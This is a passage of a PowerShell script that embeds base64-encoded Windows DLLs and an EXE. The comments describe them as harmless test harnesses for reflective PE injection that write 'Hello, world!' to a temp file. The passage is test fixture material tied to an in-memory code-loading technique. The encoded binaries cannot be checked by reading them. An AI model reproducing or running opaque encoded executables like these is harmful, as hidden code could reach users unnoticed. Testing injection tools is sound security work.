AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=='
	$Encoded32BitStringDll = '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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAADAAAABEwAAAAIAAADAAAABAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=='

	# A bare bones test harness DLL that simply writes "Hello, world!" to %TEMP%\testoutput.txt upon having VoidFunc called
	$Encoded64BitVoidDll = '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'
	$Encoded32BitVoidDll = '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'

	# A bare bones test harness EXE that simply writes "Hello, world! (EXE ARGS)" to %TEMP%\testoutput.txt
	$Encoded64BitExe = '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